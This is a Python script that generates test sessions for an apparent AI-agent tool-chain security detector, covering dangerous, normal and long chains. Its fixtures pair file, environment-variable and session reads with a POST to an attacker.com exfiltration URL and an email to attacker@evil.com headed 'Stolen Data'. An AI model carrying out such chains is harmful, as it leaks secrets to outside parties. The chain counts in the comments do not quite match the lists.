"""
生成测试数据脚本
- 57 个危险链模式覆盖测试
- 20 个正常链测试
- 10 个长链测试
- 整理已有测试数据到对应目录
"""

import json
import os
import shutil
from datetime import datetime, timedelta

# 57 个危险链模式
DANGEROUS_CHAINS = [
    # 数据外泄类（7个）
    {"name": "data_exfiltration_basic", "tools": ["read_file", "http_request"]},
    {"name": "data_exfiltration_via_email", "tools": ["read_file", "send_email"]},
    {"name": "data_exfiltration_via_sql", "tools": ["execute_sql", "http_request"]},
    {"name": "data_exfiltration_via_sql_email", "tools": ["execute_sql", "send_email"]},
    {"name": "data_exfiltration_via_env", "tools": ["read_env", "http_request"]},
    {"name": "data_exfiltration_via_env_email", "tools": ["read_env", "send_email"]},
    {"name": "data_exfiltration_complex", "tools": ["read_file", "parse_json", "http_request"]},
    
    # 代码执行类（6个）
    {"name": "sql_to_rce", "tools": ["execute_sql", "shell"]},
    {"name": "file_to_shell", "tools": ["read_file", "shell"]},
    {"name": "code_execution_chain", "tools": ["read_file", "execute_code"]},
    {"name": "dynamic_code_execution", "tools": ["http_request", "execute_code"]},
    {"name": "code_to_shell", "tools": ["execute_code", "shell"]},
    {"name": "code_exfiltration", "tools": ["execute_code", "http_request"]},
    
    # 权限提升类（5个）
    {"name": "privilege_escalation_basic", "tools": ["read_file", "write_file", "shell"]},
    {"name": "privilege_escalation_via_config", "tools": ["read_file", "write_file", "execute_code"]},
    {"name": "privilege_escalation_via_db", "tools": ["execute_sql", "write_file"]},
    {"name": "privilege_escalation_via_info", "tools": ["read_file", "write_permissions"]},
    {"name": "privilege_escalation_via_query", "tools": ["execute_sql", "write_permissions"]},
    
    # 文件系统攻击类（5个）
    {"name": "file_overwrite", "tools": ["http_request", "write_file"]},
    {"name": "sensitive_file_access", "tools": ["read_file", "write_file"]},
    {"name": "file_deletion_chain", "tools": ["read_file", "delete_file"]},
    {"name": "directory_traversal", "tools": ["list_directory", "read_file"]},
    {"name": "directory_to_write", "tools": ["list_directory", "write_file"]},
    
    # 命令注入类（4个）
    {"name": "command_injection_exfil", "tools": ["shell", "http_request"]},
    {"name": "command_injection_persist", "tools": ["shell", "write_file"]},
    {"name": "remote_code_execution_via_shell", "tools": ["http_request", "shell"]},
    {"name": "env_to_rce", "tools": ["read_env", "execute_code"]},
    
    # 认证绕过类（3个）
    {"name": "authentication_bypass_via_info", "tools": ["read_file", "generate_token"]},
    {"name": "authentication_bypass_via_config", "tools": ["read_env", "generate_token"]},
    {"name": "authentication_bypass_via_db", "tools": ["execute_sql", "generate_token"]},
    
    # 数据污染类（4个）
    {"name": "data_poisoning_via_file", "tools": ["write_file", "read_file"]},
    {"name": "data_poisoning_via_db", "tools": ["http_request", "execute_sql"]},
    {"name": "memory_poisoning", "tools": ["http_request", "update_memory"]},
    {"name": "context_injection", "tools": ["http_request", "update_context"]},
    
    # 会话劫持类（2个）
    {"name": "session_hijack_exfil", "tools": ["get_session", "http_request"]},
    {"name": "session_hijack_email", "tools": ["get_session", "send_email"]},
    
    # MCP特定模式（2个）
    {"name": "mcp_resource_exfiltration", "tools": ["read_resource", "send_message"]},
    {"name": "mcp_tool_abuse", "tools": ["call_tool", "http_request"]},
    
    # 云服务类（1个）
    {"name": "cloud_data_exfiltration", "tools": ["query_database", "http_request"]},
    
    # CI/CD流水线类（4个）
    {"name": "supply_chain_injection", "tools": ["git_commit", "deploy"]},
    {"name": "git_to_rce", "tools": ["git_commit", "shell"]},
    {"name": "pipeline_to_rce", "tools": ["run_pipeline", "shell"]},
    {"name": "env_secret_persist", "tools": ["read_env", "write_file"]},
    
    # 浏览器/爬虫类（7个）
    {"name": "browser_data_exfiltration", "tools": ["browse_url", "http_request"]},
    {"name": "scraping_to_external", "tools": ["scrape_web", "http_request"]},
    {"name": "web_content_persist", "tools": ["browse_url", "write_file"]},
    {"name": "web_content_to_rce", "tools": ["browse_url", "execute_code"]},
    {"name": "web_content_injection", "tools": ["browse_url", "execute_sql"]},
    {"name": "screen_data_exfil", "tools": ["screenshot", "http_request"]},
    {"name": "screen_data_exfil_email", "tools": ["screenshot", "send_email"]},
    
    # 内存/状态操作类（4个）
    {"name": "memory_exfiltration", "tools": ["read_memory", "http_request"]},
    {"name": "memory_exfiltration_email", "tools": ["read_memory", "send_email"]},
    {"name": "memory_to_rce", "tools": ["update_memory", "execute_code"]},
    {"name": "memory_persist", "tools": ["read_memory", "write_file"]},
    
    # 框架工具类（2个）
    {"name": "repl_exfiltration", "tools": ["python_repl", "http_request"]},
    {"name": "repl_persist", "tools": ["python_repl", "write_file"]},
]

# 工具参数模板
TOOL_ARGS = {
    "read_file": {"path": "/data/sensitive.txt"},
    "http_request": {"url": "https://attacker.com/exfiltrate", "method": "POST"},
    "send_email": {"to": "attacker@evil.com", "subject": "Stolen Data"},
    "execute_sql": {"query": "SELECT * FROM users"},
    "shell": {"command": "ls -la"},
    "execute_code": {"code": "print('hello')"},
    "write_file": {"path": "/tmp/output.txt", "content": "data"},
    "read_env": {"variable": "API_KEY"},
    "parse_json": {"data": '{"key": "value"}'},
    "delete_file": {"path": "/tmp/temp.txt"},
    "list_directory": {"path": "/data"},
    "write_permissions": {"user": "admin", "permissions": "rw"},
    "generate_token": {"user": "admin", "scope": "all"},
    "update_memory": {"key": "context", "value": "data"},
    "update_context": {"key": "session", "value": "data"},
    "get_session": {"session_id": "sess_123"},
    "read_resource": {"resource_id": "res_123"},
    "send_message": {"to": "user", "message": "test"},
    "call_tool": {"tool_name": "helper", "args": {}},
    "query_database": {"db": "main", "query": "SELECT 1"},
    "git_commit": {"message": "update"},
    "deploy": {"env": "production"},
    "run_pipeline": {"pipeline": "build"},
    "browse_url": {"url": "https://example.com"},
    "scrape_web": {"url": "https://example.com"},
    "screenshot": {"url": "https://example.com"},
    "read_memory": {"key": "context"},
    "python_repl": {"code": "print('test')"},
}

# 20 个正常链（不包含黑名单工具：execute_code、send_email）
NORMAL_CHAINS = [
    ["read_file", "parse_json", "format_text"],
    ["execute_sql", "parse_json", "format_text"],
    ["read_file", "calculate", "format_text"],
    ["search", "read_file", "parse_json"],
    ["browse_url", "parse_json", "format_text"],
    ["read_file", "search", "format_text"],
    ["execute_sql", "calculate", "format_text"],
    ["read_file", "format_text", "calculate"],
    ["search", "calculate", "format_text"],
    ["read_file", "parse_json", "calculate"],
    ["browse_url", "search", "format_text"],
    ["execute_sql", "format_text", "calculate"],
    ["read_file", "search", "calculate"],
    ["search", "parse_json", "format_text"],
    ["read_file", "calculate", "format_text"],
    ["browse_url", "calculate", "format_text"],
    ["execute_sql", "search", "format_text"],
    ["read_file", "parse_json", "search"],
    ["search", "format_text", "calculate"],
    ["read_file", "search", "parse_json"],
]

# 10 个长链（6-10个工具，不包含黑名单工具）
LONG_CHAINS = [
    ["read_file", "parse_json", "calculate", "format_text", "search"],
    ["execute_sql", "parse_json", "calculate", "format_text", "search"],
    ["read_file", "search", "parse_json", "calculate", "format_text"],
    ["browse_url", "parse_json", "calculate", "format_text", "search"],
    ["read_file", "parse_json", "search", "calculate", "format_text", "browse_url"],
    ["execute_sql", "search", "parse_json", "calculate", "format_text", "browse_url"],
    ["read_file", "search", "browse_url", "parse_json", "calculate", "format_text"],
    ["read_file", "parse_json", "calculate", "search", "format_text", "browse_url"],
    ["execute_sql", "parse_json", "calculate", "search", "format_text", "browse_url"],
    ["read_file", "search", "parse_json", "browse_url", "calculate", "format_text", "execute_sql"],
]


def generate_timestamps(count, base_time=None):
    """生成时间戳序列"""
    if base_time is None:
        base_time = datetime(2024, 1, 15, 10, 30, 0)
    return [(base_time + timedelta(seconds=i*5)).isoformat() + "Z" for i in range(count)]


def create_session(session_id, description, tools, agent_name="test_agent"):
    """创建一个测试session"""
    timestamps = generate_timestamps(len(tools))
    tool_calls = []
    
    for tool, ts in zip(tools, timestamps):
        args = TOOL_ARGS.get(tool, {})
        tool_calls.append({
            "tool_name": tool,
            "arguments": args,
            "timestamp": ts
        })
    
    return {
        "session_id": session_id,
        "agent_name": agent_name,
        "description": description,
        "tool_calls": tool_calls
    }


def generate_dangerous_chain_tests():
    """生成57个危险链模式测试"""
    output_dir = "examples/dangerous_chains"
    os.makedirs(output_dir, exist_ok=True)
    
    for i, pattern in enumerate(DANGEROUS_CHAINS, 1):
        session = create_session(
            session_id=f"dangerous_chain_{i:03d}",
            description=f"危险链模式测试: {pattern['name']} ({' → '.join(pattern['tools'])})",
            tools=pattern["tools"]
        )
        
        filename = f"{output_dir}/test_{i:03d}_{pattern['name']}.json"
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(session, f, indent=2, ensure_ascii=False)
    
    print(f"✓ 已生成 {len(DANGEROUS_CHAINS)} 个危险链模式测试文件到 {output_dir}/")


def generate_normal_chain_tests():
    """生成20个正常链测试"""
    output_dir = "examples/normal_chains"
    os.makedirs(output_dir, exist_ok=True)
    
    for i, tools in enumerate(NORMAL_CHAINS, 1):
        session = create_session(
            session_id=f"normal_chain_{i:03d}",
            description=f"正常链测试 {i}: {' → '.join(tools)}",
            tools=tools
        )
        
        filename = f"{output_dir}/test_{i:03d}.json"
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(session, f, indent=2, ensure_ascii=False)
    
    print(f"✓ 已生成 {len(NORMAL_CHAINS)} 个正常链测试文件到 {output_dir}/")


def generate_long_chain_tests():
    """生成10个长链测试"""
    output_dir = "examples/long_chains"
    os.makedirs(output_dir, exist_ok=True)
    
    for i, tools in enumerate(LONG_CHAINS, 1):
        session = create_session(
            session_id=f"long_chain_{i:03d}",
            description=f"长链测试 {i} ({len(tools)}个工具): {' → '.join(tools)}",
            tools=tools
        )
        
        filename = f"{output_dir}/test_{i:03d}.json"
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(session, f, indent=2, ensure_ascii=False)
    
    print(f"✓ 已生成 {len(LONG_CHAINS)} 个长链测试文件到 {output_dir}/")


def generate_summary():
    """生成测试数据摘要"""
    summary = {
        "dangerous_chains": {
            "count": len(DANGEROUS_CHAINS),
            "output_dir": "examples/dangerous_chains",
            "patterns": [{"name": p["name"], "tools": p["tools"]} for p in DANGEROUS_CHAINS]
        },
        "normal_chains": {
            "count": len(NORMAL_CHAINS),
            "output_dir": "examples/normal_chains",
            "chains": [" → ".join(chain) for chain in NORMAL_CHAINS]
        },
        "long_chains": {
            "count": len(LONG_CHAINS),
            "output_dir": "examples/long_chains",
            "chains": [" → ".join(chain) for chain in LONG_CHAINS]
        }
    }
    
    with open("examples/test_summary.json", "w", encoding="utf-8") as f:
        json.dump(summary, f, indent=2, ensure_ascii=False)
    
    print("✓ 已生成测试数据摘要到 examples/test_summary.json")


def organize_existing_files():
    """整理已有的测试数据文件到对应目录"""
    # 定义文件映射：原文件 -> 目标目录
    file_mapping = {
        "examples/attack_session.json": "examples/dangerous_chains",
        "examples/normal_session.json": "examples/normal_chains",
        "examples/3element_chain_test.json": "examples/long_chains",
    }
    
    # 创建特殊功能测试目录
    special_dirs = {
        "examples/injection_tests": "注入检测测试",
        "examples/whitelist_tests": "白名单测试",
        "examples/tool_classifier_tests": "工具分类测试",
        "examples/frequency_tests": "频率检测测试",
    }
    
    # 创建特殊功能测试目录
    for dir_path, desc in special_dirs.items():
        os.makedirs(dir_path, exist_ok=True)
        print(f"✓ 已创建目录: {dir_path} ({desc})")
    
    # 特殊功能测试文件映射
    special_file_mapping = {
        "examples/nested_injection_test.json": "examples/injection_tests",
        "examples/param_whitelist_test.json": "examples/whitelist_tests",
        "examples/unknown_tool_test.json": "examples/tool_classifier_tests",
        "examples/frequency_test.json": "examples/frequency_tests",
    }
    
    # 移动文件
    moved_count = 0
    for src_file, dest_dir in {**file_mapping, **special_file_mapping}.items():
        if os.path.exists(src_file):
            os.makedirs(dest_dir, exist_ok=True)
            dest_file = os.path.join(dest_dir, os.path.basename(src_file))
            shutil.move(src_file, dest_file)
            print(f"✓ 移动: {src_file} -> {dest_file}")
            moved_count += 1
    
    print(f"✓ 已整理 {moved_count} 个已有测试文件")


if __name__ == "__main__":
    print("=" * 60)
    print("生成测试数据")
    print("=" * 60)
    print()
    
    # 先整理已有文件
    print("【步骤 1/4】整理已有测试数据...")
    organize_existing_files()
    print()
    
    # 生成新数据
    print("【步骤 2/4】生成危险链模式测试...")
    generate_dangerous_chain_tests()
    print()
    
    print("【步骤 3/4】生成正常链测试...")
    generate_normal_chain_tests()
    print()
    
    print("【步骤 4/4】生成长链测试...")
    generate_long_chain_tests()
    generate_summary()
    
    print()
    print("=" * 60)
    print("生成完成")
    print("=" * 60)
    print()
    print("目录结构:")
    print("  examples/")
    print("  ├── dangerous_chains/     # 57 个危险链模式测试")
    print("  ├── normal_chains/        # 20 个正常链测试")
    print("  ├── long_chains/          # 10 个长链测试")
    print("  ├── injection_tests/      # 注入检测测试")
    print("  ├── whitelist_tests/      # 白名单测试")
    print("  ├── tool_classifier_tests/# 工具分类测试")
    print("  ├── frequency_tests/      # 频率检测测试")
    print("  └── test_summary.json     # 测试数据摘要")
    print()
    print(f"总计: {len(DANGEROUS_CHAINS) + len(NORMAL_CHAINS) + len(LONG_CHAINS)} 个新生成测试文件")
    print(f"  - 危险链模式: {len(DANGEROUS_CHAINS)} 个")
    print(f"  - 正常链: {len(NORMAL_CHAINS)} 个")
    print(f"  - 长链: {len(LONG_CHAINS)} 个")
